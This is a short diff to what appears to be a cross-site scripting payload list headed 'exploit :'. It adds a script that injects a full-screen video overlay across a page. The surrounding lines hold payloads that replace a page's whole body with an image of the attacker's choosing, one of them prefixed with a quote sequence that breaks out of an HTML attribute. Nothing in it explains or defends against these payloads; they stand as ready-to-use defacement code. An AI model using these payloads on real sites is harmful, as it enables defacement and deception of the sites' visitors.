@@ -75,6 +75,19 @@ exploit :
   document.body.appendChild(img);
 </script>
 
+<script>
+  var video = document.createElement("video");
+  video.src = "https://example.com/your-video-file.mp4";
+  video.controls = true;
+  video.style.position = "fixed";
+  video.style.left = "0";
+  video.style.top = "0";
+  video.style.width = "100%";
+  video.style.height = "100%";
+  video.style.zIndex = "9999";
+  document.body.appendChild(video);
+</script>
+
 <script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
 
 '"<script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
